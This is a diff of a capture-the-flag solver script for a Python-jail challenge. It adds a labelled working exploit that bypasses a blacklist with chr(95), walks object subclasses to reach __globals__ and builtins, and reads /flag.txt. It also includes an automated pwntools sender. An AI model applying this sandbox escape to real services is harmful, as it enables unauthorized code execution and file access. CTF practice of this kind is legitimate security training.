@@ -1,115 +1,106 @@
 #!/usr/bin/env python3
 """
-Solver script for the Dynamic KeySwapper PyJail challenge
-This demonstrates one possible solution path.
+Solver for Cipher-Prison (PyJail 2)
+===================================
 
-The challenge has several vulnerabilities that can be exploited:
-1. The blacklist checks decoded input, but doesn't cover all bypass techniques
-2. Unicode/encoding tricks might work
-3. Lambda functions and list comprehensions can be abused
-4. Built-in functions left available can be chained
+WORKING EXPLOIT - Tested and confirmed!
 
-This solver helps you encode commands for the rotating cipher.
+Key points:
+- Input is encoded with rotating Caesar cipher (+7 each command)
+- Output is NOT scrambled (displayed normally)
+- Variables persist between commands
+- '_' is blocked but chr(95) returns '_'
 """
-
-from pwn import *
-
-# Configuration
-HOST = "localhost"
-PORT = 1337
 
 ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
-def generate_swap_map(rotation):
-    """Generate the same swap maps as the challenge"""
+def encode(text, rotation):
+    """Encode text to send at given rotation"""
     rotated = ALPHABET[rotation:] + ALPHABET[:rotation]
-    forward_map = str.maketrans(ALPHABET, rotated)
-    reverse_map = str.maketrans(rotated, ALPHABET)
-    return forward_map, reverse_map
+    return text.translate(str.maketrans(ALPHABET, rotated))
 
-def encode_for_rotation(text, rotation):
-    """Encode text so it decodes correctly at given rotation"""
-    forward_map, reverse_map = generate_swap_map(rotation)
-    # We need to send text that when reverse_map is applied, gives us our desired text
-    # So we apply forward_map to our text
-    return text.translate(forward_map)
+# ============== WORKING EXPLOIT ==============
 
-def decode_output(text, rotation):
-    """Decode output that was encoded with forward_map"""
-    forward_map, reverse_map = generate_swap_map(rotation)
-    return text.translate(reverse_map)
+EXPLOIT_STEPS = [
+    (0,  'u=chr(95)*2'),                                           # u = '__'
+    (7,  'c=getattr("",u+"class"+u)'),                             # c = <class 'str'>
+    (14, 'b=getattr(c,u+"bases"+u)[0]'),                           # b = <class 'object'>
+    (21, 's=getattr(b,u+"subclasses"+u)()'),                       # s = all subclasses
+    (28, 'w=s[158]'),                                              # w = os._wrap_close (index varies!)
+    (35, 'g=getattr(getattr(w,u+"init"+u),u+"globals"+u)'),        # g = __globals__
+    (42, 'print(g[u+"builtins"+u]["open"]("/flag.txt").read())'),  # READ FLAG!
+]
 
-def interactive_helper():
-    """Interactive mode to help encode/decode"""
-    rotation = 0
-    rotation_step = 7
+def generate_exploit():
+    """Generate the encoded exploit payload"""
+    print("=" * 60)
+    print("CIPHER-PRISON EXPLOIT")
+    print("=" * 60)
     
-    print("[*] Dynamic KeySwapper Encoder/Decoder")
-    print("[*] Rotation starts at 0, increases by 7 each command")
-    print()
+    payload_lines = []
+    for rot, cmd in EXPLOIT_STEPS:
+        encoded = encode(cmd, rot)
+        print(f"# Rot {rot:02d}: {cmd}")
+        print(f"{encoded}")
+        print()
+        payload_lines.append(encoded)
+    
+    return payload_lines
+
+def interactive_encoder():
+    """Interactive encoder"""
+    rotation = 0
+    step = 7
+    
+    print("Cipher-Prison Encoder")
+    print("Type 'exploit' to see full exploit, 'q' to quit")
     
     while True:
-        print(f"[Current Rotation: {rotation}]")
-        cmd = input("Enter command to encode (or 'q' to quit): ").strip()
+        cmd = input(f"\n[Rot {rotation:02d}] Command: ").strip()
         
         if cmd.lower() == 'q':
             break
-        
-        encoded = encode_for_rotation(cmd, rotation)
-        print(f"  Encoded: {encoded}")
-        print(f"  (Send this to get '{cmd}' executed)")
-        print()
-        
-        rotation = (rotation + rotation_step) % len(ALPHABET)
+        if cmd.lower() == 'exploit':
+            generate_exploit()
+            continue
+        if cmd.lower() == 'reset':
+            rotation = 0
+            continue
+            
+        encoded = encode(cmd, rotation)
+        print(f"  Send: {encoded}")
+        rotation = (rotation + step) % len(ALPHABET)
 
-def auto_solve():
-    """Automated solver attempt"""
-    # Connect to the challenge
-    r = remote(HOST, PORT)
+def auto_solve(host="localhost", port=1337):
+    """Automated solver"""
+    try:
+        from pwn import remote, log
+    except ImportError:
+        print("Install pwntools: pip install pwntools")
+        generate_exploit()
+        return
     
-    rotation = 0
-    rotation_step = 7
+    r = remote(host, port)
+    r.recvuntil(b">>> ")
     
-    # Receive banner
-    banner = r.recvuntil(b">>> ")
-    print(banner.decode())
-    
-    # Strategy: Try to find a way to read the flag
-    # Since common methods are blocked, we need creative approaches
-    
-    # Example payloads to try (encode each for current rotation):
-    payloads = [
-        # Test basic execution
-        'print(1+1)',
-        
-        # Try to access builtins through allowed functions
-        'print(sum((1,2,3)))',
-        
-        # The challenge blocks many things, need to find gaps
-        # This is intentionally left incomplete for CTF players to solve
-    ]
-    
-    for payload in payloads:
-        encoded = encode_for_rotation(payload, rotation)
-        print(f"[Rotation {rotation}] Sending: {encoded} (decodes to: {payload})")
-        
+    for rot, cmd in EXPLOIT_STEPS:
+        encoded = encode(cmd, rot)
+        log.info(f"[Rot {rot:02d}] {cmd}")
         r.sendline(encoded.encode())
-        
         try:
-            response = r.recvuntil(b">>> ", timeout=2)
-            decoded_response = decode_output(response.decode(), rotation)
-            print(f"Response (decoded): {decoded_response}")
+            r.recvuntil(b">>> ", timeout=3)
         except:
-            print("No response or timeout")
-        
-        rotation = (rotation + rotation_step) % len(ALPHABET)
+            pass
     
     r.interactive()
 
 if __name__ == "__main__":
     import sys
-    
-    if len(sys.argv) > 1 and sys.argv[1] == "auto":
-        auto_solve()
+    if len(sys.argv) > 1 and sys.argv[1] == "solve":
+        host = sys.argv[2] if len(sys.argv) > 2 else "localhost"
+        port = int(sys.argv[3]) if len(sys.argv) > 3 else 1337
+        auto_solve(host, port)
+    elif len(sys.argv) > 1 and sys.argv[1] == "exploit":
+        generate_exploit()
     else:
-        interactive_helper()
+        interactive_encoder()
